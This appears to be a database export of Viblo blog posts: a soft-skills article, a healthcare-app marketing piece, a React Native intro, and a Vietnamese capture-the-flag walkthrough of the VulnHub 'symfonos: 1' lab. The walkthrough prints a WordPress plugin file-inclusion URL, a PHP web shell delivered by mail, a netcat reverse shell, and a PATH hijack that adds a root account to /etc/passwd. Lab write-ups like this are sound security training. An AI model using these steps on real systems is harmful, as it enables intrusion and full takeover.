bạn đối mặt với vấn đề khó. Hãy thử mô tả càng nhiều càng tốt về vấn đề bạn đang có. Bạn sẽ làm điều tương tự trong vô thức khi bạn nói chuyện với đồng nghiệp khác trong khoảng thời gian tiếp theo đấy.\n\n# Kĩ năng viết\n![](https://images.viblo.asia/95b1973b-b3e7-4c8a-b254-bfea0d589319.jpg)\nViết coded thì *dễ ẹc* mà. Bạn viết sai ở đâu thì máy tính sẽ báo lỗi cho bạn biết. Nhưng mà viết lách cho người khác thì mới là thử thách thực sự đấy.\n\nSẽ không tốn quá nhiều thời gian để bạn nhận ra rằng kĩ năng viết là một phần quan trọng trong công việc của bạn, cụ thể là lập trình. Bạn phải viết document cho code của bạn, gửi email cho đồng nghiệp, mô tả requirements và ngay cả mô tả code của bạn chạy như thế nào trong comment Git.\n\nKĩ năng viết là kĩ năng chuyển hoá ý nghĩ và cảm xúc của bạn ra ngôn từ. Khi bạn viết một thứ gì đấy, hãy để ý đến chủ đề, đối tượng (sếp, đồng nghiệp, cấp duới,...) và phương thức (Skype, Email,... ) mà bạn đang sử dụng.\n\nNếu như trao đổi công việc với một anh bạn đồng nghiệp, bạn có thể nói nhiều hơn về khía cạnh technical, điều đó vẫn ổn. Nhưng khi bạn giải thích cách hệ thống hoạt động cho đội marketing bằng những cụm từ như `callback` hay là `API` thì nó sẽ trở nên vô nghĩa đối với họ. Bạn sẽ nhận ra rằng khi gửi tin nhắn, **cách mà bạn nói** thường quan trọng hơn là **bạn đang nói về cái gì**.\n\nĐiều này cũng tương tự đối với nói chuyện giao tiếp hằng ngày, nhưng việc viết lách khó hơn bởi vì khi bạn viết cho nhiều người cùng một lúc, thay vì một cuộc đối thoại 1 - 1, bạn chỉ có một cơ hội duy nhất để gửi tin nhắn đó đi. Nếu như có ai đó chưa hiểu được ý bạn ngay lần đầu, thì họ cũng không có cơ hội để hỏi lại bạn ngay được.\n\nĐiều này đặc biệt quan trọng khi bạn viết code documentation hoặc một bài viết (như cái này). Viết một cách rõ ràng nhất cho mọi người có thể dễ dàng hiểu được là một điều quan trọng trong việc viết lách của bạn.\n\nĐể cải thiện kĩ năng viết của bạn, lời khuyên của tôi là hãy viết về những thứ bạn biết và bạn yêu thích càng nhiều càng tốt. Và hãy dành thời gian của bạn ra để đọc thật nhiều. Mỗi ngày dành một ít thời gian để đọc về công nghệ mới chẳng hạn. Bạn không chỉ cải thiện kĩ năng viết mà còn học được nhiều thứ mới nữa đấy.\n\n# Kết luận\nDevelopers thường nghĩ công việc của họ là về máy tính, và đó là một sai lầm tệ hại. Công việc lập trình là xoay quanh con người, máy tính chỉ là công cụ của chúng ta mà thôi. Bạn tạo ra những giải pháp làm cho cuộc sống của con người trở nên tốt hơn và dễ dàng hơn, và điều này cần một sự đồng cảm lớn. \n\nNếu bạn hỏi tôi: "Kĩ năng nào là quan trọng nhất đối với một junior developer?" thì tôi xin trả lời rằng bạn nên học cách làm việc nhóm. Tất cả kĩ năng trong bài viết này sẽ giúp bạn đạt được mục tiêu đó.\n\nBạn sẽ có thể đổi lĩnh vực, làm trái ngành trong vài năm tới. Bạn có thể bỏ lập trình để lên vị trí quản lí, nhưng bạn sẽ phải làm việc với con người cho đến cuối cuộc đời. Và một người biết cách làm việc nhóm sẽ là mong muốn của các nhà tuyển dụng hơn là một tài năng cô độc đấy.\n\n\n# Tham khảo\nBài viết dựa theo bài gốc của tác giả [@vmarchesin](https://medium.com/@vmarchesin)\n\nhttps://medium.com/free-code-camp/what-you-need-to-know-for-your-first-developer-job-that-you-wont-learn-in-school-2ab39551026\n\n> > **P.S:** Bài viết này dành tặng cho Mèo "Dobie" Vũ, mong bạn sẽ gặp nhiều may mắn và thành công trong 2 năm tới. Chùa cô Phi vẫn ở đó chờ bạn quay về. 🚬\n\n> > Xin cảm ơn Tuệ Đen và chị Mu đã giúp em hoàn thành bài viết này 💕	![](https://images.viblo.asia/a25327b1-181c-4d44-87ca-42e3ef5f6f93.jpg)\n\n\nGiới thiệu\nCó rất nhiều thứ quan trọng cần học để trở thành một developer: thuật toán, cấu trúc dữ liệu, các ngôn ngữ lập trình,... không thể đếm xuể được. Đấy là vấn đề trước khi chúng ta thực sự chọn một ngôn ngữ lập trình để bắt đầu. Go đang là xu hướng hiện nay. JavaScript đang là ngôn ngữ phổ biến nhất năm 2018. Hơn 3 tỷ thiết bị đang chạy trên Java. Wow, thật khó khăn để chọn một ngôn ng...	{https://images.viblo.asia/a25327b1-181c-4d44-87ca-42e3ef5f6f93.jpg,https://images.viblo.asia/e9e6e34e-82a5-4c8f-9017-25f1e2f5b6e4.png,https://images.viblo.asia/44fdc56b-33f7-4056-a839-6e34e629053a.jpg,https://images.viblo.asia/95b1973b-b3e7-4c8a-b254-bfea0d589319.jpg}	1	Những thứ mà bạn không được dạy ở trường đại học cho công việc lập trình đầu tiên của bạn	{soft-skills,git}	0	f	2022-12-18 15:33:38.465+00	2022-12-18 15:33:38.465+00
31863	![](https://images.viblo.asia/0ce27129-6eed-4487-b0b9-adf52d2cf8fc.jpg)\nThe intensifying trend of mobility solutions agreement can be seen most significantly in the healthcare industry. Implementing these solutions have resulted in better patient care and experience. Blending IoT and AI in this industry will be a game changer. \n\nNo doubt, the outlook of the health care industry will rely on the mobility solution you design. Many healthcare technologies like wearables, Internet of Medical things(IoMT), etc had been developed to improve the patient's care.\n\nA study in 2018 shows that 72% of people felt that mobile apps perk up the patient's well-being, providing clinically actionable intelligence at the patient's bedside.\nIt is also expected that 97% of hospital nurses and 98% of doctors will use mobility solutions by 2022.\n\nMobile is reforming the patient care and driving efficiencies across the areas of healthcare. Focus on enhancing patients outcome by creating a successful clinical mobility approach. With the switch toward patient-centric care models, top hospitals are investing in mobile communication solutions to improve care quality, shrink healthcare delivery costs, and amplify patient satisfaction. \n\nNo surprise that healthcare executives progressively contemplate mobile devices to be a fundamental part of the clinical strategy for boosting communication, efficiency, and productivity.\nAre you wondering how the integration of [mobility solution](https://www.bigziel.com/mobile-application-development.php) makes the patient care in the hospital better? Don’t worry let me precise you how.\n\n## WHY MOBILITY HEALTH SOLUTIONS IN HOSPITALS?\n\n**PAPERLESS MEDICAL RECORDS:**\n\nGone are the days of using paper charts, waiting for the transcription details, decrypting scribbled notes. The transformation to the electronic medical records (EMR) is vital in bringing forward into the challenging healthcare environment. The EMR is stored in the central healthcare system which is accessible to the health care physicians from the mobile.  Obtain software support for strategic planning, workflow model, work resources training and customer support. \n\n* The EMR helps to enhance the communication between the patient and the health care professional thereby increasing data tracking and patient satisfaction.\n* Medical errors can be eliminated by securing the patient's record which is not applicable in the traditional way of maintaining the health care records.\n* Patient scheduling, report generation, e-prescribing can be prepared by the physicians to the patients to make the process easy.\n\nFrom the research of BMJ Quality & Safety study, EMR has reduced the death rates by 15%.\n\n**SIMPLE CONSULTING AND COMMUNICATION:**\n\nFixing an appointment for consulting the health care professional was a tedious task. It is a marathon where you need to stand in a very long queue to fix an appointment. With the advent of mobility solutions, the consultation process is made much simpler using mobile phones.\nThere is a number of places in the hospital within where the communication plays a vital role. For instance, health care professionals can send the medicine details of a patient via EMR to their pharmacy. This process is made smooth by health care mobility solutions.\n\nThe emergency situation can be met by the nurses themselves by contacting the health care professional to take the right decision. \n\nThere has been a revolution in mobile apps that provides healthcare solutions to the patients online through the video call. This works as a whole like a hospital in mobile. \n\n**KNOW THE PATIENTS THROUGH MOBILITY SOLUTION**:\n\nAs a health care provider, your first objective should be the patients care. It should not be compromised at any cost. The patient's medical history, his previously prescribed medicines, current diagnosis, lab reports can be viewed from anywhere through the health care mobility solution app. The mobility solutions facilitate in\n\n* ease the overburdened health care staffs\n* Timely patient care\n* Operation schedule\n* Organization\n* Inpatient and outpatient management\n \nThere are a number of apps which enables the calculation of blood pressure, heart rate, glucose level within no time. \n\n**OPTIMIZES NURSING ACTIVITIES:**\n\nTo know about their shifts, provide the patients the medicine on time, update with the task the health care mobility solution app plays a major role. The app helps is assisting the nurses to attend the patient and provide the utmost care.\n\nThere is an app called NurseAlert which is a bomb to keep the nurses up-to-date like shift management, attending patients on time, providing medicines with the help of the reminders in the app.\n\nSince the patient's data are stored online, there are security threats posed on that information of the patients in health care mobility solutions.\n\n## SECURITY CHALLENGES TO HEALTH CARE MOBILITY SOLUTIONS:\n\nThe health care mobility solutions leverage technologies like cloud, web applications, mobile applications to create an organizational infrastructure. This mobility solution helps the employees to access all the healthcare information of the patients and their personal information from the smartphone, laptops, PDAs, tablets, etc.\n\nDimension Data's recent survey proves that mobility solutions bring 90% of productivity. 44% of the people stated that they were not able to access all the information from the centralized system since there are security concerns.\n92% of the enterprises have limitations for the employees for accessing sensitive resources and data from their mobile phones.\n\nLet us see the solutions for security threats to the enterprise.\n\n**ACCESS CONTROL**\n\nIt's becoming difficult for organizations to keep track of the patients and employees who accesses the hospital's network. So, to stay away from security breaches that evolve from unauthorized users, the healthcare centers allow only a few personnel to access sensitive information.\n\nStringent Identity Authentication can be made to overcome security threats. 2-factor authentication is used for cloud-based mobility solutions.\n\n**ENCRYPTION**\n\nIt plays a vital game in data protection. It can protect the data even when the device is stolen with no password in it. To make this viable, there is a need for a protected workplace where all the data are protected. As soon as any activity is viewed outside the secured workplace, the protected apps get locked automatically.\n\n**FOLLOW  RESTRICTION POLICY:**\n\nEducate the employees about the risk of using the third party app. Training must be provided regularly for enforcing the mobile restriction policy.\n\n**SOFTWARE UPDATION**\n\nI hope you are no strange to a pop us that arrives making aware of the software updates. It actually tempts you to press Remind me later button. For god's sake, don’t click it, instead update your software for the following reason.\n\n* Repairs security holes \n* Fixes bugs\n* Facilitates to patch security flaws\n* It's not only you (if your device occupies virus, you may pass it to your friends, family and, colleagues too).\n\n**ENFORCE SOFTWARE CERTIFICATE RESTRICTION POLICY:**\n\nSoftware restriction policy facilitates the users and the devices from executing unauthorized code such as trojan, viruses, etc. This certificate rule must be enabled in the setting of software restriction policy.\n\n**ENABLE GEOFENCING IN THE DEVICE**\n\nGeofencing enables an extra layer of security to the mobile devices who are trying to control the enterprise-owned and employee-owned devices. \n\nThe Geofencing technology can locate the lost device with the help of GPS and a local beacon. \nIt is an essential perimeter around a geographic area that can supply an additional layer of access control to business resources, not only servers.  For instance, the functionality and access rights assigned to mobile applications can be changed automatically based on the location of the device relative to geofence boundaries.\n\nWith geofencing technology, you can ensure devices do not leave definite areas, like an office environment.\n\n### STUMBLE UPON WHOM TO CONTACT TO BUILD A MOBILITY APP SOLUTION FOR HEALTHCARE?\n\nThe developers at bigziel have a hands-on experience in [building a mobile app for healthcare solutions](https://medium.com/r/?url=https%3A%2F%2Fwww.bigziel.com%2Fmobile-application-development.php) to treat the patients more efficiently and in timely manner. Don’t waste much time. We always welcome the clients with innovative ideas for the app development. So, feel free to reach us and obtain our support to support the ailing patients.	![](https://images.viblo.asia/0ce27129-6eed-4487-b0b9-adf52d2cf8fc.jpg)\n\n\nThe intensifying trend of mobility solutions agreement can be seen most significantly in the healthcare industry. Implementing these solutions have resulted in better patient care and experience. Blending IoT and AI in this industry will be a game changer.\n\nNo doubt, the outlook of the health care industry will rely on the mobility solution you design. Many healthcare technologies like wearabl...	{https://images.viblo.asia/0ce27129-6eed-4487-b0b9-adf52d2cf8fc.jpg}	1	How Healthcare Mobility Solutions Can Improve The Patient’s Care In Hospital	{healthcare-app-development,healthcare-mobility-solution,heathcare-mobile-app-development,mobile-patient-care}	0	f	2022-12-18 15:33:38.501+00	2022-12-18 15:33:38.501+00
31843	## Mở đầu\n- Lại là mình đây, vào mấy hôm rảnh rỗi lại mò vào vulhub.com để kiếm mấy bài lab để học hỏi, kiếm được bài **Difficulty: Beginner** nên build lên làm luôn xem nó có **Beginner** không :v: \n- Đây là một bài lab khá mới của tác giả **Zayotic** trong series **symfonos**. \n- Link bài lab nếu ai muốn khám phá: [symfonos: 1](https://www.vulnhub.com/entry/symfonos-1,322/)\n## Tấn công\n- Việc đầu tiên vẫn như thường ngày, build bài lab lên rồi quét địa chỉ ip của nó. Ở đây mình sử dụng `arp-scan` để quét cho nhanh.\n    ```bash\n    root@kali: arp-scan -l\n    Interface: eth0, datalink type: EN10MB (Ethernet)\n    Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)\n    192.168.19.34\t00:0c:29:a0:2f:e9\tVMware, Inc.\n    ```\n  ![](https://images.viblo.asia/bdc15fcd-b466-4e01-af27-1ad77d0fdce3.png)\n- Web gì thế này, có mỗi cái ảnh là sao, tôi là ai, đây là đâu :scream::scream::scream::scream:\n- Thử scan tất cả cổng trên này xem sao\n    ```bash\n    root@kali:~/Desktop# nmap -p- -A 192.168.19.34\n    Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-10 14:56 +07\n    Nmap scan report for symfonos.local (192.168.19.34)\n    Host is up (0.00077s latency).\n    Not shown: 65530 closed ports\n    PORT    STATE SERVICE     VERSION\n    22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n    | ssh-hostkey: \n    |   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)\n    |   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)\n    |_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)\n    25/tcp  open  smtp        Postfix smtpd\n    |_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, \n    | ssl-cert: Subject: commonName=symfonos\n    | Subject Alternative Name: DNS:symfonos\n    | Not valid before: 2019-06-29T00:29:42\n    |_Not valid after:  2029-06-26T00:29:42\n    |_ssl-date: TLS randomness does not represent time\n    80/tcp  open  http        Apache httpd 2.4.25 ((Debian))\n    |_http-server-header: Apache/2.4.25 (Debian)\n    |_http-title: Site doesn't have a title (text/html).\n    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n    445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)\n    MAC Address: 00:0C:29:A0:2F:E9 (VMware)\n    Device type: general purpose\n    Running: Linux 3.X|4.X\n    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\n    OS details: Linux 3.2 - 4.9\n    Network Distance: 1 hop\n    Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n    TRACEROUTE\n\n    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n    Nmap done: 1 IP address (1 host up) scanned in 16.08 seconds\n    ```\n- Con máy này đang sử dụng dịch vụ mail smtp, có samba kìa, thử vào xem có gì k\n  ![](https://images.viblo.asia/17b6e45f-e1b6-4eb0-bccb-dac0a69084fe.png)\n- Có thư mục anonymous, vào mở thì thấy có một tin nhắn của thần Zeus =))\n    ```\n    Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! \n\n    Next person I find using one of these passwords will be fired!\n\n    -Zeus\n    ```\n- Thử mấy cái `epidioko`, `qwerty` với `baseball` xem thần Zeus có block thật hay không :v: \n- Thử được thư mục helios có mật khẩu là `qwerty` thật :joy:\n- Có 2 mẩu tin ở đây\n- file `research.txt`:\n    ```\n    Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.\n    ```\n- file `todo.txt`: \n    ```\n    1. Binge watch Dexter\n    2. Dance\n    3. Work on /h3l105\n    ```\n- Humm, thử vào http://192.168.19.34/h3l105 xem sao. (À quên, add `192.168.19.34 symfonos.local` vào /etc/hosts đã)\n- 1 trang Wordpress \n\n    ![](https://images.viblo.asia/9d3b1b6d-4165-4217-a326-ac3a43d25efb.png)\n- Sử dụng `wpscan` thì thấy có lỗi như sau:\n    ```bash\n    root@kali:~# wpscan --url http://symfonos.local/h3l105/ --plugins-detection aggressive\n    [+] mail-masta\n     | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/\n     | Latest Version: 1.0 (up to date)\n     | Last Updated: 2014-09-19T07:52:00.000Z\n     | Readme: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt\n     | [!] Directory listing is enabled\n     |\n     | Detected By: Known Locations (Aggressive Detection)\n     |\n     | [!] 2 vulnerabilities identified:\n     |\n     | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)\n     |     References:\n     |      - https://wpvulndb.com/vulnerabilities/8609\n     |      - https://www.exploit-db.com/exploits/40290/\n     |      - https://cxsecurity.com/issue/WLB-2016080220\n     |\n     | [!] Title: Mail Masta 1.0 - Multiple SQL Injection\n     |     References:\n     |      - https://wpvulndb.com/vulnerabilities/8740\n     |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095\n     |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096\n     |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097\n     |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098\n     |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin\n     |\n     | Version: 1.0 (100% confidence)\n     | Detected By: Readme - Stable Tag (Aggressive Detection)\n     |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt\n     | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\n     |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt\n    ```\n- Đọc một hồi về plugin `mail-masta` thì ở đây có dính Local File Inclusion (LFI)\n\n    http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd\n    ![](https://images.viblo.asia/b5102935-8350-4f5a-8d00-3a48e558d46a.png)\n    \n- Ở file `/etc/passwd` ta xác định được có những user sau\n    ```\n    root\n    helios\n    mysql\n    zeus\n    wordpress\n    ```\n- Check lại bằng `smtp-user-enum` thì có đúng 3 users này có mail.\n    ```bash\n    root@kali:~# smtp-user-enum -M VRFY -U users.txt -t 192.168.19.34\n    Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )\n\n     ----------------------------------------------------------\n    |                   Scan Information                       |\n     ----------------------------------------------------------\n\n    Mode ..................... VRFY\n    Worker Processes ......... 3\n    Usernames file ........... users.txt\n    Target count ............. 1\n    Username count ........... 3\n    Target TCP port .......... 25\n    Query timeout ............ 3 secs\n    Target domain ............ \n\n    ######## Scan started at Wed Jul 10 16:07:52 2019 #########\n    192.168.19.34: root exists\n    192.168.19.34: helios exists\n    192.168.19.34: mysql exists\n    ######## Scan completed at Wed Jul 10 16:07:53 2019 #########\n    3 results.\n    ```\n- Chắc hẳn là phải có thư mục chứa mail, mình có thể đọc được mail người khác gửi đến `helios` \n    ![](https://images.viblo.asia/cf92086e-ad3f-4eec-a029-0661de4f6456.png)\n- Thử gửi thư với payload cho `helios` xem sao\n    ```bash\n    root@kali:~# telnet 192.168.19.34 25\n    Trying 192.168.19.34...\n    Connected to 192.168.19.34.\n    Escape character is '^]'.\n    220 symfonos.localdomain ESMTP Postfix (Debian/GNU)\n    HELO localhost\n    250 symfonos.localdomain\n    MAIL FROM: tuan@symfonos.localdomain\n    250 2.1.0 Ok\n    RCPT TO: helios\n    250 2.1.5 Ok\n    DATA\n    354 End data with <CR><LF>.<CR><LF>\n    <?php system($_GET['c']); ?>\n    ```\n- Giờ ta sử dụng đường dẫn sau để kiểm tra xem sao:\n\n    `view-source:http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id`\n    ![](https://images.viblo.asia/9f83bba3-89d2-4752-ae4a-78c701946e24.png)\n- Ok thành công rồi, chúng ta đã có 1 chú shell =))\n- Tiếp theo thì ta remote đến nó thôi\n- Đầu tiên thì mở `nc -lvp 4444` bên máy mình đã\n- Sử dụng http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc%20-e%20/bin/bash%20-nv%20192.168.19.100%204444 để remote ngược về.\n    ![](https://images.viblo.asia/01bfd890-cbe7-42ac-9bb5-b8b42b1446eb.png)\n- Ngon, chúng ta đã có máy victim rồi :v:\n    ```bash\n    helios@symfonos:/home$ find / -perm -u=s 2>/dev/null\n    find / -perm -u=s 2>/dev/null\n    /usr/lib/eject/dmcrypt-get-device\n    /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n    /usr/lib/openssh/ssh-keysign\n    /usr/bin/passwd\n    /usr/bin/gpasswd\n    /usr/bin/newgrp\n    /usr/bin/chsh\n    /usr/bin/chfn\n    /opt/statuscheck\n    /bin/mount\n    /bin/umount\n    /bin/su\n    /bin/ping\n    helios@symfonos:/home$ \n    ```\n    \n- Có vẻ như `/opt/statuscheck` có thể khai thác được, thử run nó lên xem có gì k\n    ```bash\n    helios@symfonos:/opt$ ./statuscheck\n    ./statuscheck\n    HTTP/1.1 200 OK\n    Date: Thu, 11 Jul 2019 01:49:50 GMT\n    Server: Apache/2.4.25 (Debian)\n    Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT\n    ETag: "148-58c6b9bb3bc5b"\n    Accept-Ranges: bytes\n    Content-Length: 328\n    Vary: Accept-Encoding\n    Content-Type: text/html\n    ```\n- Humm, nó chỉ kiểm tra cái trang web có Ok hay k, thử chạy `strings /opt/statuscheck` thì ra 1 đoạn này \n    ```bash\n    curl -I H\n    http://lH\n    ocalhostH\n    ```\n    Dịch ra sẽ là:\n    ```bash\n    curl -I http://localhost\n    ```\n- Chúng ta cần khám phá được lệnh thực thi này\n- Có vài phương thức, nhưng ở trong trường hợp này, dựa trên đầu ra `curl ...` nó đang thực thi với **đường dẫn tương đối** của nó, có nghĩa là, với đường dẫn có trong biến môi trường **$PATH**\n    ```bash\n    PATH ABSOLUTE: /usr/bin/curl\n    PATH RELATIVELY: curl\n    ```\n- *Việc của chúng ta bây giờ là phải thay đổi biến $PATH của `helios` và chuyển hướng của chương trình `statuscheck` sang một thứ mà ta có thể kiểm soát được. Thay vì chạy trong `/usr/bin/curl`, ta sẽ điều hướng về để nó thực thi trong `/tmp/curl` chẳng hạn.*\n- Giờ chúng ta vào thư mục `/tmp` rồi tạo 1 file `curl`, trong file đó có thứ mình muốn để nó chạy lên với quyền `root`, vì khi chạy `/opt/statuscheck`, nó sẽ kích hoạt quyền `root` lên. Và với cái `curl` giả kia, bạn có thể chạy quyền `root` với nội dung là bên trong cái file `curl` vừa tạo.\n- Ở đây mình sẽ chọn cách thêm luôn 1 tài khoản `root` vào hệ thống.\n- Cấu trúc của file `/etc/passwd`:\n```username:password_crypt:user_id:group_id:name:home_directory:shell```\n- Vậy giờ mình sẽ tạo 1 file như này :\n    `minhtuan:x:0:0:root:/root:/usr/bin/bash` với `x` là mật khẩu được `crypt`.\n    \n    Mình sẽ sử dụng `perl` để `crypt` password.\n    ```bash\n   root@kali:~# perl -e 'print crypt("minhtuanact", "ahihi")'\n    ahd.h7gFshGUw\n    ```\n- Vậy `ahd.h7gFshGUw` là `password crypt`, hoàn thiện đoạn thêm user kia sẽ là:\n    ```\n    minhtuan:ahd.h7gFshGUw:0:0:root:/root:/usr/bin/bash\n    ```\n- Giờ sẽ ghi vào file `/tmp/curl` với nội dung sẽ là \n    ```bash\n    echo minhtuan:ahd.h7gFshGUw:0:0:root:/root:/bin/bash >> /etc/passwd\n    ```\n\n    Lệnh này nó sẽ thêm cái tài khoản của mình mới tạo kia vào `/etc/passwd`. Giờ sẽ phải đánh lừa `statuscheck` để nó chạy cái thằng `curl` giả kia lên rồi đăng nhập với tài khoản vừa tạo là xong :v:\n- Xúc thôi :v:\n    ```bash\n    helios@symfonos:/tmp$ export PATH=/tmp\n    export PATH=/tmp\n    helios@symfonos:/tmp$ /opt/statuscheck\n    /opt/statuscheck\n    sh: 1: curl: Permission denied\n    helios@symfonos:/tmp$ \n    ```\n- Ơ `Permission denied`, à chết quên chưa cấp quyền cho file `curl` :joy:\n    ```bash\n    helios@symfonos:/tmp$ export PATH=$PATH_BACKUP\n    export PATH=$PATH_BACKUP\n    helios@symfonos:/tmp$ chmod +x curl\n    chmod +x curl\n    helios@symfonos:/tmp$ export PATH=/tmp\n    export PATH=/tmp\n    helios@symfonos:/tmp$ /opt/statuscheck\n    /opt/statuscheck\n    helios@symfonos:/tmp$ \n    ```\n- Ok rồi, thử switch sang tài khoản vừa được tạo xem (trước tiên phải chạy `export PATH=$PATH_BACKUP` trước nhé, không là k có lệnh thực thi đâu)\n    ```bash\n    helios@symfonos:/tmp$ su minhtuan\n    su minhtuan\n    Password: minhtuanact\n    root@symfonos:/tmp# id\n    id\n    uid=0(root) gid=0(root) groups=0(root)\n    ```\n- Vậy là ta đã có quyền root rồi. Đọc cờ cuối thôi\n ![](https://images.viblo.asia/ce773acd-b4d0-49d4-9124-ed97373682af.png)\n \n## Tổng kết\n- Bài này ở mức độ **Beginner** nhưng mình chẳng thấy nó **Beginner** tý nào lắm :joy::joy:\n- Mong các bạn có thể học hỏi được gì thông qua bài này. Nếu các bạn cảm thấy hay thì cho mình 1 upvote nhé :D	Mở đầu\n- Lại là mình đây, vào mấy hôm rảnh rỗi lại mò vào vulhub.com để kiếm mấy bài lab để học hỏi, kiếm được bài Difficulty: Beginner nên build lên làm luôn xem nó có Beginner không :v:\n- Đây là một bài lab khá mới của tác giả Zayotic trong series symfonos.\n- Link bài lab nếu ai muốn khám phá: symfonos: 1\nTấn công\n- Việc đầu tiên vẫn như thường ngày, build bài lab lên rồi quét địa chỉ ip của ...	{https://images.viblo.asia/bdc15fcd-b466-4e01-af27-1ad77d0fdce3.png,https://images.viblo.asia/17b6e45f-e1b6-4eb0-bccb-dac0a69084fe.png,https://images.viblo.asia/9d3b1b6d-4165-4217-a326-ac3a43d25efb.png,https://images.viblo.asia/b5102935-8350-4f5a-8d00-3a48e558d46a.png,https://images.viblo.asia/cf92086e-ad3f-4eec-a029-0661de4f6456.png,https://images.viblo.asia/9f83bba3-89d2-4752-ae4a-78c701946e24.png,https://images.viblo.asia/01bfd890-cbe7-42ac-9bb5-b8b42b1446eb.png,https://images.viblo.asia/ce773acd-b4d0-49d4-9124-ed97373682af.png}	1	VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution	{cybersecurity,labs,local-file-inclusion}	0	f	2022-12-18 15:33:38.527+00	2022-12-18 15:33:38.527+00
31812	![](https://images.viblo.asia/8b8cedae-45ce-4558-b562-7692bd5cd675.png)\n\nReact native là một công cụ giúp chúng ta lập trình đa nền tảng để tạo ra các ứng dụng trên môi trường native. Nó là một framework mã nguồn mở được phát triển bởi Facebook, cho phép bạn sử dụng Java script để phát triển phần mềm trên điện thoại di động Android và IOS. React native cũng giống như React vậy chúng sử dụng các native components thay vì các web components. Vì vậy để hiểu về cấu trúc của React native chúng ta cần phải có các kiến thức cơ bản với các khái niệm cơ bản của React như là JSX, components, props hay là state.\n\nTrước khi đi vào các phần chính, chúng ta hãy thử điểm qua xem rằng React native có những điểm lợi và điểm yếu gì. Nó có đáng để chúng ta bỏ công sức ra để tìm hiểu hay không?\n## Advantages and Disadvantages\n\n![](https://images.viblo.asia/63416380-42fa-4467-94ba-c2421bd4275a.jpg)\n\nMình cũng chỉ mới tìm hiểu về React native nên cũng không thể liết kê hết những điểm tốt và chưa tốt của nó được. Nhưng một số ưu điểm mà có thể nhìn thấy ngay được khi mới bắt đầu tìm hiểu về nó như là:\n* Khả năng tái sử dụng code và các components đã được phát triển sẵn.\n* Có một cộng đồng developers hùng hậu.\n* Sự tuyệt vời của Live and Hot reloading. (Bạn sẽ tiết kiệm được cả một đống thời gian nhìn xcode build và running app của bạn)\n* Tiết kiệm effort khi có thể code 1 mà có thể run cho cả ios và android.\n\nBên cạnh đó cũng có một vài những nhược điểm cần phải kể đến:\n* Vẫn đòi hỏi native code.\n* Hiệu năng sẽ thấp hơn với app thuần native code.\n* Bảo mật không cao do dựa trên JS.\n* Quản lý bộ nhớ.\n* Khả năng tùy biến cũng không thực sự tốt đối với một vài module.\n\nTuy có những mặt hạn chế nhưng những lợi ích mà nó đem lại thì lại không hề nhỏ, vì vậy hãy thử bắt tay vào tìm hiểu về nó nhé.\n\n## Prepare and install\nVì mình đang sử dụng MacOS nên bài viết này mình cũng sẽ chỉ đề cập đến cách cài đặt trên mac thôi, thông tin thêm có thể tham khảo [tại đây](https://facebook.github.io/react-native/docs/getting-started) \nĐầu tiên thì chúng ta được recommend cài đặt [Homebrew](https://brew.sh/) dùng để cài đặt Node và Watchman.\nXong đó là cài đặt Node, Watchman (là công cụ giúp chúng ta theo dõi sự thay đổi để cập nhật chúng) và React native CLI.\n```\nbrew install node\nbrew install watchman\n```\n\n![](https://images.viblo.asia/0a1593ab-af82-4bfa-8f2d-4a3ca1b46b9f.png)\n\nTiếp sau đó chúng ta cần có Xcode để có React native có thể sử dụng simulator của máy ảo.\nMột trình biên dịch code ví dụ như Atom, Visual studio code, SublineText, ....\n\n## React native concepts\n### Components\nComponents là một khái niệm cơ bản của cả React và React native. Chính việc chia nhỏ ứng dụng thành các components nhỏ tạo nên tính tái sử dụng cao và khả năng mở rộng của chúng. Hãy thử phân tích một ví dụ đơn giản trước.\n\n![](https://images.viblo.asia/fc03a067-ca8b-41cc-aa4d-714bdaaa63a0.png)\n\nĐây là một list cơ bản về thông tin của album có tên albumn, tên ca sĩ thể hiện, 